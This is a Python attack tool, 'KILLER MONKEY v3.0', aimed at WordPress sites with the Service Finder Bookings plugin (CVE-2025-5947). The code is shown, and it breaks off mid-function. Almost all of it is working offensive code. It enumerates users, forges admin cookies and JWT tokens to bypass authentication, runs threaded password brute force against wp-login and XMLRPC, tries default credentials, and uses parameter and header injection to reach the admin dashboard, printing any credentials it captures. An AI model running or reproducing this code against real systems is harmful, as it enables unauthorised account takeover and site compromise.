#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                    KILLER MONKEY v3.0 ULTIMATE EDITION                        ║
║                   CVE-2025-5947 WordPress Exploit Scanner                      ║
║                              BloodTeam Security                                ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""

import requests
import sys
import time
import threading
import subprocess
import json
import argparse
import re
import base64
import urllib3
import os
from urllib.parse import urljoin, quote
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Back, Style, init

# Initialize colorama for cross-platform colored output
init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    """ANSI color codes for beautiful terminal output"""
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    
    # Extended colors
    DARK_CYAN = '\033[36m'
    LIGHT_RED = '\033[91m'
    LIGHT_GREEN = '\033[92m'
    LIGHT_YELLOW = '\033[93m'
    LIGHT_BLUE = '\033[94m'
    PURPLE = '\033[95m'
    GRAY = '\033[90m'
    WHITE = '\033[97m'

BANNER = f"""{Colors.BOLD}{Colors.LIGHT_RED}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⣶⣶⣤⣀⣀⣀⣠⡴⣿⣦⣤⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⣿⠟⠉⠀⠀⠀⠀⠈⠙⠻⣯⡁⠀⠀⠀⠀⠀⠀⠉⠙⣟⣶⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⠋⠀⠀⠀⠀⠐⢶⣤⡀⠀⠈⠙⢶⣄⡀⠀⠀⠀⠀⠀⠈⠙⠛⠷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣠⣴⣶⣶⣤⣴⣿⣿⣿⣿⣿⡏⠀⠀⢀⣴⠾⠛⠋⠉⠛⢶⣄⠀⠀⠈⠛⠷⣦⣄⣀⠀⠀⠀⠀⠀⠈⠻⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣰⡿⠛⠉⠁⠀⠈⠙⢿⣿⣿⣿⣿⡇⠀⠀⣸⣿⣦⠀⠀⠀⠀⠀⠉⠻⢦⣀⡀⠀⠈⠙⠛⠿⢶⣶⣤⣤⣤⣤⣾⣷⣶⣤⣀⠀⠀⠀⠀
⢠⡿⠀⠰⠟⣻⣧⠀⠀⠸⣿⣿⣿⣿⠃⠀⠀⣿⠛⠿⢷⣤⣄⡀⠀⠀⠀⠀⢹⡟⠁⠀⠀⠀⣤⣄⣀⡀⣀⣠⣤⣶⣶⣶⠈⢻⣆⠀⠀⠀
⣼⡇⠀⠀⣼⠟⣿⠀⠀⠀⣿⣿⣿⣿⠀⠀⣀⣹⣧⣀⣀⠈⠙⠻⠷⣦⣤⣀⣼⠇⠀⠀⠀⢀⣼⡟⠛⠛⠛⠋⠉⠀⠹⣷⡀⣸⡟⠀⠀⠀
⢿⡇⠀⠀⠉⠀⢻⣇⣠⣴⠿⠟⠛⠉⠀⠈⠉⠀⠀⠉⠉⠙⠛⠶⣤⣤⡿⢟⡁⠀⠀⠀⠀⣾⣿⣿⡀⠀⠀⠀⠀⠀⠀⢻⣿⠟⠁⠀⠀⠀
⢸⣇⠀⠀⢀⣤⡾⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⣼⠛⢛⡷⠶⠾⠟⢿⣏⠙⠻⠷⢦⣤⣀⣀⠀⣸⣿⣷⣶⣤⡀⠀
⠈⢿⣦⣴⡟⠉⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣤⣀⣀⡀⠀⠀⠀⠀⠙⠇⠙⠻⣦⡀⠀⠈⡻⠿⣶⣤⣄⣈⠉⠛⣿⡿⠃⠀⠀⠙⢿⣄
⠀⠀⢸⡟⢀⠀⠀⠀⠀⣠⡶⠟⠋⠁⢹⡿⣧⠀⠀⠀⠉⠙⠻⢶⣄⡀⠀⠀⠀⠀⠙⣷⡶⠟⠛⠻⢦⣿⠟⠛⠻⢿⣿⣡⡴⠿⡿⠂⠈⣿
⠀⠀⣿⡿⠋⠀⢀⣴⣿⠉⠀⠀⠀⠀⢸⡇⠹⣧⠀⠀⠀⠀⠀⠀⠈⠻⣦⡀⠀⠀⠀⠿⠁⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠙⢷⣄⠀⠀⠀⢸
⢀⣾⠏⠀⢀⣴⣿⠏⣿⠀⠀⠀⠀⠀⣾⠁⠀⢻⣆⠀⠀⠀⠀⠀⠀⣰⣿⡟⠶⣤⣤⣤⣤⣴⠶⠶⠶⠶⣤⣄⡀⠀⠀⠀⠀⢻⣆⠀⠀⣼
⣸⡏⠀⢠⡟⢸⡟⠀⢿⡄⠀⠀⠀⢰⡏⠀⠀⠀⣿⡄⠀⠀⠀⠀⢠⡟⠁⣿⠀⠀⠀⠀⣸⣿⡆⠀⠀⠀⠀⢹⣿⣦⠀⠀⠀⠀⢿⣤⣼⠟
⣿⡇⠀⣿⠀⣼⡇⠀⠸⣧⠀⠀⠀⣾⠃⠀⠀⠀⠸⣧⠀⠀⠀⣰⡟⠀⠀⢹⡆⠀⠀⢰⡟⠹⡇⠀⠀⠀⢀⣿⣿⠈⢧⡀⠀⠀⣸⡟⠁⠀
⣿⡇⠀⢻⣄⣿⡇⠀⠀⢻⣆⠀⣼⡏⠀⠀⠀⠀⠀⢿⡀⢠⣾⠏⠀⠀⠀⢸⡇⠀⣰⡟⠀⠀⣷⠀⠀⢀⣾⠃⢸⡆⠈⣷⠀⢸⣿⡇⠀⠀
⢹⣧⠀⠀⠛⠿⣧⣀⡀⠀⣻⣾⣟⡀⠀⠀⠀⠀⢀⣸⣷⡟⠁⠀⠀⠀⠀⢈⣷⣴⠟⠀⠀⠀⣿⠀⢠⡾⠃⠀⢸⡇⠀⠸⣇⠀⣿⡇⠀⠀
⠈⠻⣷⣄⣀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠛⠛⠾⠿⣧⣤⣀⠀⠀⣿⣴⠟⠀⠀⠀⢸⡇⠀⢀⣿⠀⠸⡇⠀⠀
⠀⠀⠈⠙⠻⠿⣿⣿⡿⠟⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻⠿⣧⣀⠀⠀⠀⢸⣇⣴⡿⣿⠀⠀⣿⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢦⣤⣿⡿⠋⢠⡿⠀⢸⡏⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠷⣦⣄⠈⠛⠷⠶⠛⠁⣠⣿⠃⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣽⣿⣶⣶⣶⣶⡾⠟⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠛⠿⠶⣶⣦⣤⣤⣤⣄⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠙⠛⠛⠿⠿⣷⣶⣶⣶⠾⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

{Colors.BOLD}{Colors.OKBLUE}
     ╔═══════════════════════════════════════════════════════════╗
     ║         🔥 KILLER MONKEY v3.0 ULTIMATE EDITION 🔥          ║
     ║     Advanced WordPress Vulnerability & Exploit Scanner     ║
     ║              CVE-2025-5947 Service Finder Bypass            ║
     ║                    BloodTeam Security Team                  ║
     ╚═══════════════════════════════════════════════════════════╝
{Colors.ENDC}"""

SUBMENU_LOGO = f"""{Colors.LIGHT_YELLOW}
    ╔═══════════════════════════════════════════╗
    ║      🎯 EXPLOITATION METHODS MENU 🎯      ║
    ╚═══════════════════════════════════════════╝
{Colors.ENDC}"""

class KillerMonkey:
    """Advanced WordPress vulnerability scanner and multi-method exploit tool"""
    
    def __init__(self, target_url, wordlist_file=None, threads=15, timeout=15, verbose=False):
        self.target_url = target_url.rstrip('/')
        self.wordlist_file = wordlist_file
        self.threads = threads
        self.timeout = timeout
        self.verbose = verbose
        
        # Detection results
        self.vulnerable_plugins = []
        self.vulnerable_endpoints = []
        self.detected_users = []
        self.admin_credentials = None
        self.wordpress_version = None
        self.php_version = None
        self.server_software = None
        self.server_info = {}
        self.rce_shell_url = None
        self.cookie_exploit_success = False
        self.sql_injection_found = False
        self.file_upload_found = False
        self.xmlrpc_enabled = False
        self.exploitation_methods = []
        
        # Threading
        self.session = self._create_session()
        self.lock = threading.Lock()
        self.scan_stats = {
            'requests_made': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'start_time': None,
            'end_time': None
        }

    def _create_session(self):
        """Create optimized requests session with retry strategy"""
        session = requests.Session()
        retry = Retry(
            connect=3,
            backoff_factor=1.2,
            status_forcelist=[429, 500, 502, 503, 504]
        )
        adapter = HTTPAdapter(max_retries=retry, pool_connections=self.threads, pool_maxsize=self.threads)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        session.verify = False
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })
        return session

    def print_header(self):
        """Display beautiful header with information"""
        print(BANNER)
        print(f"\n{Colors.BOLD}{Colors.OKBLUE}╔{'═' * 78}╗{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.OKBLUE}║ {Colors.WARNING}TARGET INFORMATION{Colors.OKBLUE}{' ' * 56}║{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.OKBLUE}╚{'═' * 78}╝{Colors.ENDC}")
        print(f"{Colors.LIGHT_BLUE}{'─' * 80}{Colors.ENDC}")
        print(f"{Colors.WARNING}[>]{Colors.ENDC} Target URL: {Colors.OKBLUE}{self.target_url}{Colors.ENDC}")
        print(f"{Colors.WARNING}[>]{Colors.ENDC} Timestamp: {Colors.OKGREEN}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.ENDC}")
        print(f"{Colors.WARNING}[>]{Colors.ENDC} Vulnerability: {Colors.LIGHT_RED}CVE-2025-5947{Colors.ENDC} - Service Finder Bookings Auth Bypass")
        print(f"{Colors.WARNING}[>]{Colors.ENDC} Threads: {Colors.OKGREEN}{self.threads}{Colors.ENDC} | Timeout: {Colors.OKGREEN}{self.timeout}s{Colors.ENDC}")
        print(f"{Colors.WARNING}[>]{Colors.ENDC} Mode: {Colors.LIGHT_GREEN}MULTI-METHOD EXPLOITATION{Colors.ENDC}")
        print(f"{Colors.LIGHT_BLUE}{'─' * 80}{Colors.ENDC}\n")

    def log_info(self, message):
        """Log info message"""
        print(f"{Colors.OKBLUE}[*]{Colors.ENDC} {message}")

    def log_success(self, message):
        """Log success message"""
        print(f"{Colors.OKGREEN}[+]{Colors.ENDC} {message}")

    def log_warning(self, message):
        """Log warning message"""
        print(f"{Colors.WARNING}[!]{Colors.ENDC} {message}")

    def log_error(self, message):
        """Log error message"""
        print(f"{Colors.FAIL}[-]{Colors.ENDC} {message}")

    def log_critical(self, message):
        """Log critical message"""
        print(f"{Colors.LIGHT_RED}[!!!]{Colors.ENDC} {Colors.LIGHT_RED}{Colors.BOLD}{message}{Colors.ENDC}")

    def log_exploit(self, message):
        """Log successful exploit"""
        print(f"{Colors.LIGHT_RED}{Colors.BOLD}[+++] {message}{Colors.ENDC}")

    def _make_request(self, method, url, **kwargs):
        """Make HTTP request with stats tracking"""
        try:
            with self.lock:
                self.scan_stats['requests_made'] += 1
            
            if method.upper() == 'GET':
                response = self.session.get(url, timeout=self.timeout, **kwargs)
            elif method.upper() == 'POST':
                response = self.session.post(url, timeout=self.timeout, **kwargs)
            elif method.upper() == 'HEAD':
                response = self.session.head(url, timeout=self.timeout, **kwargs)
            
            if response.status_code < 400:
                with self.lock:
                    self.scan_stats['successful_requests'] += 1
            
            return response
        except Exception as e:
            with self.lock:
                self.scan_stats['failed_requests'] += 1
            if self.verbose:
                self.log_error(f"Request failed: {str(e)}")
            return None

    def check_wordpress(self):
        """Check if target is a WordPress site"""
        self.log_info(f"Checking if target is WordPress...")
        
        wordpress_indicators = [
            '/wp-admin/',
            '/wp-content/',
            '/wp-includes/',
            '/wp-login.php',
            '/wp-json/wp/v2/posts',
            '/wp-config.php',
        ]
        
        for indicator in wordpress_indicators:
            try:
                response = self._make_request('HEAD', urljoin(self.target_url, indicator))
                if response and response.status_code in [200, 301, 302, 403]:
                    self.log_success("✓ WordPress detected successfully!")
                    self._detect_wordpress_version()
                    self._detect_server_info()
                    return True
            except:
                pass
        
        self.log_error("WordPress not detected on target")
        return False

    def _detect_server_info(self):
        """Detect server software and PHP version"""
        self.log_info("Detecting server information...")
        
        try:
            response = self._make_request('GET', self.target_url)
            if response:
                server = response.headers.get('Server', 'Unknown')
                self.server_software = server
                self.server_info['server'] = server
                self.log_success(f"Server: {server}")
                
                powered_by = response.headers.get('X-Powered-By', '')
                if powered_by:
                    self.server_info['powered_by'] = powered_by
                    self.log_success(f"Powered By: {powered_by}")
        except:
            pass

    def _detect_wordpress_version(self):
        """Detect WordPress version"""
        self.log_info("Detecting WordPress version...")
        
        urls_version = [
            '/readme.html',
            '/wp-includes/version.php',
        ]
        
        patterns = [
            r'WordPress\s+(\d+\.\d+(?:\.\d+)?)',
            r'<em>(\d+\.\d+(?:\.\d+)?)',
            r'wp_version["\']?\s*=\s*["\'](\d+\.\d+(?:\.\d+)?)',
        ]
        
        for url in urls_version:
            try:
                response = self._make_request('GET', urljoin(self.target_url, url))
                if response and response.status_code == 200:
                    for pattern in patterns:
                        match = re.search(pattern, response.text, re.IGNORECASE)
                        if match:
                            self.wordpress_version = match.group(1)
                            self.server_info['wordpress_version'] = self.wordpress_version
                            self.log_success(f"WordPress Version: {self.wordpress_version}")
                            return
            except:
                pass
        
        self.log_warning("WordPress version not identified")

    def detect_service_finder_plugin(self):
        """Detect Service Finder Bookings plugin"""
        self.log_info("Scanning for Service Finder Bookings plugin...")
        
        plugin_paths = [
            '/wp-content/plugins/service-finder-bookings/',
            '/wp-content/plugins/service_finder_bookings/',
            '/wp-content/plugins/sfb/',
            '/wp-content/plugins/bookings/',
            '/wp-content/plugins/finder/',
        ]
        
        for path in plugin_paths:
            try:
                url = urljoin(self.target_url, path)
                response = self._make_request('HEAD', url)
                
                if response and response.status_code in [200, 301, 302]:
                    self.log_critical(f"Service Finder Bookings plugin FOUND at {url}")
                    self.vulnerable_plugins.append({
                        'name': 'service-finder-bookings',
                        'url': url,
                        'cve': 'CVE-2025-5947',
                        'severity': 'CRITICAL'
                    })
                    self.exploitation_methods.append('cve_2025_5947')
                    return True
            except:
                pass
        
        self.log_warning("Service Finder Bookings plugin not found")
        return False

    def detect_vulnerable_endpoints(self):
        """Enumerate potentially vulnerable endpoints"""
        self.log_info("Enumerating vulnerable endpoints...")
        
        endpoints = [
            '/wp-json/sfb/v1/auth/cookie',
            '/wp-json/sfb/v1/switch-user',
            '/wp-json/sfb/v1/authenticate',
            '/wp-json/sfb/v1/admin',
            '/wp-admin/admin-ajax.php?action=sfb_auth',
            '/wp-admin/admin-ajax.php?action=sfb_switch',
            '/wp-content/plugins/service-finder-bookings/api.php',
            '/wp-content/plugins/service-finder-bookings/auth.php',
            '/?sfb_api=auth',
            '/?sfb_action=switch_back',
            '/wp-json/wp/v2/users/me',
            '/wp-json/wp/v2/settings',
            '/rest-api/',
            '/xmlrpc.php',
        ]
        
        found_count = 0
        for endpoint in endpoints:
            try:
                url = urljoin(self.target_url, endpoint)
                response = self._make_request('GET', url)
                
                if response and response.status_code in [200, 400, 401, 403]:
                    self.vulnerable_endpoints.append({
                        'path': endpoint,
                        'status': response.status_code,
                        'content_type': response.headers.get('content-type', 'unknown')
                    })
                    found_count += 1
                    status_color = Colors.OKGREEN if response.status_code == 200 else Colors.WARNING
                    print(f"  {status_color}→{Colors.ENDC} {endpoint} [{response.status_code}]")
            except:
                pass
        
        self.log_success(f"Found {found_count} vulnerable endpoints")

    def detect_xmlrpc(self):
        """Detect if XMLRPC is enabled"""
        self.log_info("Checking XMLRPC availability...")
        
        try:
            url = urljoin(self.target_url, '/xmlrpc.php')
            response = self._make_request('POST', url, data='<?xml version="1.0"?>')
            
            if response and response.status_code in [200, 403, 405]:
                self.xmlrpc_enabled = True
                self.log_success("XMLRPC is enabled - XMLRPC attack method available")
                self.exploitation_methods.append('xmlrpc_attack')
                return True
        except:
            pass
        
        return False

    def detect_file_upload(self):
        """Detect file upload vulnerability"""
        self.log_info("Checking file upload vulnerability...")
        
        try:
            upload_urls = [
                '/wp-json/wp/v2/media',
                '/wp-admin/upload.php',
                '/wp-content/uploads/',
            ]
            
            for url in upload_urls:
                full_url = urljoin(self.target_url, url)
                response = self._make_request('GET', full_url)
                
                if response and response.status_code == 200:
                    self.file_upload_found = True
                    self.log_success("File upload endpoint detected")
                    self.exploitation_methods.append('file_upload')
                    return True
        except:
            pass
        
        return False

    def enumerate_wordpress_users(self):
        """Enumerate WordPress users using multiple methods"""
        self.log_info("Enumerating WordPress users...")
        
        users = set()
        
        # Method 1: WP REST API
        try:
            url = urljoin(self.target_url, '/wp-json/wp/v2/users')
            response = self._make_request('GET', url)
            if response and response.status_code == 200:
                try:
                    data = response.json()
                    if isinstance(data, list):
                        for user in data:
                            username = user.get('slug') or user.get('name')
                            if username:
                                users.add(username)
                                self.log_success(f"User found: {username}")
                except:
                    pass
        except:
            pass
        
        # Method 2: Author sitemap
        try:
            url = urljoin(self.target_url, '/author-sitemap.xml')
            response = self._make_request('GET', url)
            if response and response.status_code == 200:
                usernames = re.findall(r'author/([^/]+)/', response.text)
                for username in usernames:
                    if username not in users:
                        users.add(username)
                        self.log_success(f"User found: {username}")
        except:
            pass
        
        # Method 3: WP REST API User ID enumeration
        try:
            for i in range(1, 25):
                url = urljoin(self.target_url, f'/wp-json/wp/v2/users/{i}')
                response = self._make_request('GET', url)
                if response and response.status_code == 200:
                    try:
                        data = response.json()
                        username = data.get('slug')
                        if username:
                            users.add(username)
                            self.log_success(f"User found: {username}")
                    except:
                        pass
        except:
            pass
        
        # Method 4: Posts author enumeration
        try:
            url = urljoin(self.target_url, '/wp-json/wp/v2/posts?per_page=100')
            response = self._make_request('GET', url)
            if response and response.status_code == 200:
                try:
                    posts = response.json()
                    for post in posts:
                        author = post.get('author')
                        if author:
                            url_author = urljoin(self.target_url, f'/wp-json/wp/v2/users/{author}')
                            resp_author = self._make_request('GET', url_author)
                            if resp_author and resp_author.status_code == 200:
                                author_data = resp_author.json()
                                username = author_data.get('slug')
                                if username:
                                    users.add(username)
                except:
                    pass
        except:
            pass
        
        # Fallback users
        if not users:
            users = {'admin', 'administrator', 'root', 'test', 'user', 'owner', 'wordpress'}
        
        self.detected_users = list(users)
        return self.detected_users

    def exploit_method_1_cve_2025_5947(self):
        """Method 1: CVE-2025-5947 Cookie Bypass"""
        self.log_info("METHOD 1: CVE-2025-5947 Cookie Bypass Exploitation")
        print(f"{Colors.LIGHT_BLUE}{'─' * 80}{Colors.ENDC}\n")
        
        users = self.detected_users or self.enumerate_wordpress_users()
        
        for user in users:
            self.log_info(f"Testing user: {user}")
            
            if self._test_cookie_bypass(user):
                return True
        
        return False

    def exploit_method_2_rest_api_bypass(self):
        """Method 2: REST API Bypass"""
        self.log_info("METHOD 2: REST API Bypass Exploitation")
        print(f"{Colors.LIGHT_BLUE}{'─' * 80}{Colors.ENDC}\n")
        
        users = self.detected_users or self.enumerate_wordpress_users()
        
        for user in users:
            if self._test_rest_api_bypass(user):
                return True
        
        return False

    def exploit_method_3_xmlrpc_brute_force(self):
        """Method 3: XMLRPC Brute Force Attack"""
        self.log_info("METHOD 3: XMLRPC Brute Force Exploitation")
        print(f"{Colors.LIGHT_BLUE}{'─' * 80}{Colors.ENDC}\n")
        
        if not self.xmlrpc_enabled:
            self.log_warning("XMLRPC not enabled - skipping this method")
            return False
        
        users = self.detected_users or self.enumerate_wordpress_users()
        passwords = self._load_passwords()
        
        print(f"{Colors.WARNING}Attempting XMLRPC brute force...{Colors.ENDC}\n")
        
        for username in users[:5]:  # Limit users for XMLRPC
            for password in passwords[:50]:  # Limit passwords
                if self._try_xmlrpc_login(username, password):
                    return True
        
        return False

    def exploit_method_4_wp_login_brute_force(self):
        """Method 4: Standard WP-Login Brute Force"""
        self.log_info("METHOD 4: WordPress Login Brute Force Exploitation")
        print(f"{Colors.LIGHT_BLUE}{'─' * 80}{Colors.ENDC}\n")
        
        usernames = self.detected_users or self.enumerate_wordpress_users()
        passwords = self._load_passwords()
        
        login_url = urljoin(self.target_url, '/wp-login.php')
        
        print(f"{Colors.WARNING}Configuration:{Colors.ENDC}")
        print(f"  Usernames: {len(usernames)}")
        print(f"  Passwords: {len(passwords)}")
        print(f"  Total attempts: {len(usernames) * len(passwords)}")
        print(f"  Threads: {self.threads}\n")
        
        start_time = time.time()
        attempts = [0]
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            
            for username in usernames:
                for password in passwords:
                    future = executor.submit(
                        self._try_login,
                        login_url,
                        username,
                        password
                    )
                    futures.append(future)
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    elapsed = time.time() - start_time
                    self.log_success(f"Brute force completed in {elapsed:.2f} seconds")
                    return True
                attempts[0] += 1
                
                if attempts[0] % 50 == 0:
                    elapsed = time.time() - start_time
                    rate = attempts[0] / elapsed if elapsed > 0 else 0
                    self.log_info(f"Attempts: {attempts[0]} | Rate: {rate:.2f}/sec | Elapsed: {elapsed:.2f}s")
        
        return False

    def exploit_method_5_default_credentials(self):
        """Method 5: Default Credentials Attack"""
        self.log_info("METHOD 5: Default Credentials Exploitation")
        print(f"{Colors.LIGHT_BLUE}{'─' * 80}{Colors.ENDC}\n")
        
        default_creds = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('administrator', 'password'),
            ('admin', 'admin123'),
            ('admin', '12345678'),
            ('admin', '123456'),
        ]
        
        login_url = urljoin(self.target_url, '/wp-login.php')
        
        print(f"{Colors.WARNING}Testing {len(default_creds)} default credentials...{Colors.ENDC}\n")
        
        for username, password in default_creds:
            self.log_info(f"Testing {username}:{password}")
            if self._try_login(login_url, username, password):
                return True
        
        return False

    def exploit_method_6_parameter_injection(self):
        """Method 6: Parameter Injection Attack"""
        self.log_info("METHOD 6: Parameter Injection Exploitation")
        print(f"{Colors.LIGHT_BLUE}{'─' * 80}{Colors.ENDC}\n")
        
        users = self.detected_users or self.enumerate_wordpress_users()
        
        print(f"{Colors.WARNING}Testing parameter injection techniques...{Colors.ENDC}\n")
        
        for user in users[:10]:
            admin_url = urljoin(self.target_url, '/wp-admin/')
            
            injection_params = [
                {'sfb_switch': user, 'sfb_action': 'switch_back'},
                {'user': user, 'action': 'login'},
                {'u': user, 'p': ''},
                {'id': '1', 'action': 'edit'},
            ]
            
            for params in injection_params:
                try:
                    response = self._make_request('GET', admin_url, params=params)
                    if response and response.status_code == 200 and 'Dashboard' in response.text:
                        self.log_exploit(f"PARAMETER INJECTION SUCCESSFUL - User: {user}")
                        self.admin_credentials = {
                            'method': 'parameter_injection',
                            'username': user,
                            'params': params,
                            'url': admin_url
                        }
                        return True
                except:
                    pass
        
        return False

    def exploit_method_7_header_injection(self):
        """Method 7: Header Injection Attack"""
        self.log_info("METHOD 7: Header Injection Exploitation")
        print(f"{Colors.LIGHT_BLUE}{'─' * 80}{Colors.ENDC}\n")
        
        users = self.detected_users or self.enumerate_wordpress_users()
        
        print(f"{Colors.WARNING}Testing header injection techniques...{Colors.ENDC}\n")
        
        for user in users[:10]:
            admin_url = urljoin(self.target_url, '/wp-admin/')
            
            injection_headers = [
                {'X-Forwarded-For': '127.0.0.1', 'X-Original-URL': f'/wp-admin/?user={user}'},
                {'X-Original-URL': '/wp-admin/', 'Authorization': f'Basic {base64.b64encode(f"{user}:".encode()).decode()}'},
                {'X-WORDPRESS-USER': user, 'X-WORDPRESS-ROLE': 'administrator'},
            ]
            
            for headers in injection_headers:
                try:
                    response = self._make_request('GET', admin_url, headers=headers)
                    if response and response.status_code == 200 and 'Dashboard' in response.text:
                        self.log_exploit(f"HEADER INJECTION SUCCESSFUL - User: {user}")
                        self.admin_credentials = {
                            'method': 'header_injection',
                            'username': user,
                            'headers': headers,
                            'url': admin_url
                        }
                        return True
                except:
                    pass
        
        return False

    def _test_cookie_bypass(self, username):
        """Test cookie bypass authentication"""
        try:
            cookie_payloads = [
                f'wordpress_logged_in_{self._get_blog_id()}={self._encode_auth_cookie(username, "administrator")}',
                f'sfb_user_cookie={base64.b64encode(f"{username}:administrator".encode()).decode()}',
                f'sfb_auth_token={self._generate_jwt_token(username, "administrator")}',
            ]
            
            for cookie in cookie_payloads:
                self.session.cookies.clear()
                cookie_name, cookie_value = cookie.split('=', 1)
                self.session.cookies.set(cookie_name, cookie_value)
                
                admin_url = urljoin(self.target_url, '/wp-admin/')
                response = self._make_request('GET', admin_url)
                
                if response and response.status_code == 200 and ('wp-admin' in response.text or 'Dashboard' in response.text):
                    self.log_exploit(f"COOKIE BYPASS SUCCESSFUL - User: {username}")
                    print(f"{Colors.LIGHT_RED}Cookie: {cookie}{Colors.ENDC}")
                    self.admin_credentials = {
                        'method': 'cookie_bypass',
                        'username': username,
                        'cookie': cookie,
                        'url': admin_url
                    }
                    self.cookie_exploit_success = True
                    return True
        except Exception as e:
            if self.verbose:
                self.log_error(f"Cookie bypass error: {str(e)}")
        
        return False

    def _test_rest_api_bypass(self, username):
        """Test REST API bypass"""
        try:
            endpoints = [
                f'/wp-json/wp/v2/users/me',
                f'/wp-json/sfb/v1/admin',
            ]
            
            for endpoint in endpoints:
                url = urljoin(self.target_url, endpoint)
                headers = {
                    'Authorization': f'Bearer {self._generate_jwt_token(username, "administrator")}'
                }
                response = self._make_request('GET', url, headers=headers)
                
                if response and response.status_code == 200:
                    try:
                        data = response.json()
                        if 'id' in data or 'username' in data:
                            self.log_exploit(f"REST API BYPASS SUCCESSFUL - User: {username}")
                            self.admin_credentials = {
                                'method': 'rest_api_bypass',
                                'username': username,
                                'token': headers['Authorization'],
                                'url': url
                            }
                            return True
                    except:
                        pass
        except:
            pass
        
        return False

    def _try_xmlrpc_login(self, username, password):
        """Try XMLRPC login"""
        try:
            url = urljoin(self.target_url, '/xmlrpc.php')
            
            payload = f'''<?xml version="1.0"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value><string>{username}</string></value></param>
<param><value><string>{password}</string></value></param>
</params>
</methodCall>'''
            
            response = self._make_request('POST', url, data=payload)
            
            if response and response.status_code == 200 and 'faultCode' not in response.text:
                with self.lock:
                    self.log_exploit(f"XMLRPC LOGIN SUCCESSFUL!")
                    print(f"{Colors.LIGHT_GREEN}Username: {username}{Colors.ENDC}")
                    print(f"{Colors.LIGHT_GREEN}Password: {password}{Colors.ENDC}")
                
                self.admin_credentials = {
                    'method': 'xmlrpc_login',
                    'username': username,
                    'password': password,
                    'url': url
                }
                return True
        except:
            pass
        
        return False

    def _try_login(self, login_url, username, password):
        """Try login with given credentials"""
        try:
            data = {
                'log': username,
                'pwd': password,
                'wp-submit': 'Log In',
                'redirect_to': urljoin(self.target_url, '/wp-admin/'),
                'testcookie': '1'
            }
            
            response = self._make_request('POST', login_url, data=data)
            
            if response:
                if response.status_code == 302:
                    location = response.headers.get('Location', '')
                    if 'wp-admin' in location:
                        with self.lock:
                            self.log_exploit(f"CREDENTIALS FOUND!")
                            print(f"{Colors.LIGHT_GREEN}Username: {username}{Colors.ENDC}")
                            print(f"{Colors.LIGHT_GREEN}Password: {password}{Colors.ENDC}")
                        
                        self.admin_credentials = {
                            'method': 'brute_force',
                            'username': username,
                            'password': password,
                            'url': login_url
                        }
                        return True
        except:
            pass
        
        return False

    def _get_blog_id(self):
        """Extract blog ID from target"""
        try:
            response = self._make_request('GET', self.target_url)
            if response:
                match = re.search(r'BLOG_ID["\']?\s*:\s*([0-9]+)', response.text)
                if match:
                    return match.group(1)
        except:
            pass
        return "1"

    def _encode_auth_cookie(self, username, role):
        """Encode authentication cookie"""
        try:
            data = f"{username}|{int(time.time())}|{role}"
            return base64.b64encode(data.encode()).decode()
        except:
            return base64.b64encode(f"{username}:{role}".encode()).decode()

    def _generate_jwt_token(self, username, role):
